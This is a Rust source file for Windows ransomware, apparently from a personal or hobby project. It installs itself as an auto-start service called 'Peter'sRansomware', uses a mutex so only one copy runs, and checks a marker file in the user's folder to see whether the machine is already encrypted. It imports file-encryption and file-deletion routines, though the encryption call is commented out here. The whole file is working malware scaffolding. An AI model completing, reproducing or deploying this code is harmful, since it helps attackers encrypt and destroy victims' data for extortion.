#[cfg(windows)]
extern crate winapi;

mod encryption;
mod lib;
mod traversing;
use encryption::{decrypt, encrypt, generate_key};
use std::ffi::CString;
use std::ptr::null_mut;
use std::str;
use traversing::{traverse_and_delete, traverse_and_encrypt};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::libloaderapi::GetModuleFileNameA;
use winapi::um::synchapi::CreateMutexA;
use winapi::um::winbase::{GetUserNameA, OpenMutexA};
use winapi::um::winnt::{HANDLE, SERVICE_AUTO_START, SERVICE_WIN32_OWN_PROCESS};
use winapi::um::winsvc::{
    CloseServiceHandle, CreateServiceA, OpenSCManagerA, StartServiceCtrlDispatcherA, SC_HANDLE,
    SC_MANAGER_CREATE_SERVICE, SERVICE_CHANGE_CONFIG, SERVICE_TABLE_ENTRYA,
};
fn main() {
    let service_table_entry: SERVICE_TABLE_ENTRYA = SERVICE_TABLE_ENTRYA {
        lpServiceName: CString::new("ransomware").unwrap().as_ptr(),
        lpServiceProc: Some(start_ransomware),
    };
    unsafe {
        StartServiceCtrlDispatcherA(&service_table_entry);
        start_ransomware(0, null_mut());
    }
}

unsafe extern "system" fn start_ransomware(
    dwNumServicesArgs: u32,
    lpServiceArgVectors: *mut *mut i8,
) {
    let sc_manager: SC_HANDLE = OpenSCManagerA(
        null_mut(), // connect to local computer manager
        null_mut(), // SERVICES_ACTIVE_DATABASE default
        SC_MANAGER_CREATE_SERVICE,
    );

    if sc_manager == null_mut() {
        println!("Fail {}", GetLastError());
        std::process::exit(0);
    }
    let mut name: Vec<i8> = Vec::new();
    name.resize(200, 0i8);
    let name_length = GetModuleFileNameA(null_mut(), name.as_mut_ptr(), 200);
    let mut path_name: Vec<u8> = Vec::new();
    for i in 0..name_length {
        path_name.push(name[i as usize].clone() as u8);
    }

    CreateServiceA(
        sc_manager,
        CString::new("Peter'sRansomware").unwrap().as_ptr(),
        CString::new("Peter'sRansomware").unwrap().as_ptr(),
        SERVICE_CHANGE_CONFIG,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        0,
        CString::new(path_name).unwrap().as_ptr(),
        null_mut(),
        null_mut(),
        null_mut(),
        null_mut(),
        null_mut(),
    );

    if check_mutex() {
        // if a version of the code already running,exit
        std::process::exit(0);
    }
    if already_encrypt() {
        std::process::exit(0);
    }
    println!("fuck");
    CloseServiceHandle(sc_manager);
    // traverse_and_encrypt();
}

fn check_mutex() -> bool {
    unsafe {
        let mutex_handle: HANDLE =
            OpenMutexA(0x1f0001, 0, CString::new("Peter114").unwrap().as_ptr());

        if mutex_handle == null_mut() {
            CreateMutexA(null_mut(), 0, CString::new("Peter114").unwrap().as_ptr());
            return false;
        } else {
            return true;
        }
    }
}

fn already_encrypt() -> bool {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut _user_name: Vec<u8> = Vec::new();
    unsafe {
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);

        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        _user_name = std::mem::transmute(buffer);
        _user_name.resize((size - 1) as usize, 0u8);

        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(str::from_utf8(&_user_name[..]).unwrap());
        full_path.push_str("\\peter_yeet.peter");

        let full_path: CString = CString::new(full_path).unwrap();

        if CreateFileA(
            full_path.as_ptr(),
            1,
            1,
            null_mut(),
            OPEN_EXISTING,
            0x80,
            null_mut(),
        ) == INVALID_HANDLE_VALUE
        {
            return false;
        }
    }
    true
}
